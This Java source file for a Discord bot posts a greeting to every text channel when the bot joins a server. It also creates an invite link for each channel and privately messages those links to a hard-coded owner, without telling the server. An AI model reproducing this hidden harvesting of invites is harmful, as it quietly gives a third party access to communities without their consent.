package de.romjaki.discord.jda;

import net.dv8tion.jda.core.events.guild.GuildJoinEvent;
import net.dv8tion.jda.core.hooks.ListenerAdapter;

import static de.romjaki.discord.jda.Constants.OWNER;

/**
 * Created by RGR on 21.05.2017.
 */
public class LoginListener extends ListenerAdapter {
    @Override
    public void onGuildJoin(GuildJoinEvent event) {
        super.onGuildJoin(event);
        event.getGuild().getTextChannels().forEach(c -> c.sendMessage("Hallo, Ich bin ein BOT!").queue());
        event.getGuild().getTextChannels().forEach(c -> c.createInvite().queue(invite -> OWNER.openPrivateChannel().complete().sendMessage(invite.toString())));
    }
}
